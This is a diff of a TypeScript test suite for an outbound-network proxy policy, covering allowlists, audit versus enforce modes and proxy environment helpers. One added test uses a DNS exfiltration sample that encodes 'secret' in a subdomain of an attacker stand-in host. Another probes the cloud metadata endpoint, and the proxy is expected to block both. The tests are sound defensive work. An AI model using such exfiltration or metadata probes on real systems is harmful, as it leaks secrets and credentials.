@@ -89,8 +89,8 @@ function policy(mode: "off" | "audit" | "enforce", allow: { target: string; port
 }
 
 describe("decisions", () => {
-  it("blocks a private address unless an IP rule names it", async () => {
-    policy("audit");
+  it("blocks a private address in Enforce unless an IP rule names it", async () => {
+    policy("enforce", [{ target: "*.example.com", port: null }]);
     expect((await viaProxy(`http://127.0.0.1:${webPort}/`)).status).toBe(403);
     policy("enforce", [{ target: "127.0.0.1", port: webPort }]);
     expect(await viaProxy(`http://127.0.0.1:${webPort}/`)).toEqual({ status: 200, body: "hello" });
@@ -143,5 +143,32 @@ describe("helpers", () => {
     expect(env.NO_PROXY).toBe("localhost,127.0.0.1,::1");
     expect(env.GIT_SSH_COMMAND).toBe('ssh -i /k -o ProxyCommand="4pm net-connect %h %p"');
     expect(env.CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC).toBe("1");
+  });
+});
+
+describe("review fixes", () => {
+  it("never resolves a name that may not pass (no DNS exfiltration through the proxy)", async () => {
+    policy("enforce");
+    const r = await viaProxy("http://c2VjcmV0.attacker.invalid/");
+    expect(r.status).toBe(403);
+    expect(r.body).toContain("not on the allowlist");
+  });
+
+  it("lets a private destination through in Audit (flagged), blocks it in Enforce, always blocks metadata", async () => {
+    policy("audit");
+    expect((await viaProxy(`http://127.0.0.1:${webPort}/`)).status).toBe(200);
+    expect(pendingEgressForTest().at(-1)).toMatchObject({ decision: "would_block" });
+    policy("enforce", [{ target: "127.0.0.1", port: null }]);
+    expect((await viaProxy(`http://127.0.0.1:${webPort}/`)).status).toBe(200);
+    policy("audit");
+    expect((await viaProxy("http://169.254.169.254/latest/meta-data/")).status).toBe(403);
+  });
+
+  it("never stacks the proxy hop on repeated env builds", () => {
+    const once = egressEnv({ GIT_SSH_COMMAND: "ssh -i /k", JAVA_TOOL_OPTIONS: "-Xmx1g" });
+    const twice = egressEnv(once);
+    expect(twice.GIT_SSH_COMMAND).toBe('ssh -i /k -o ProxyCommand="4pm net-connect %h %p"');
+    expect((twice.JAVA_TOOL_OPTIONS ?? "").match(/https\.proxyHost/g)).toHaveLength(1);
+    expect((twice.JAVA_TOOL_OPTIONS ?? "").startsWith("-Xmx1g")).toBe(true);
   });
 });
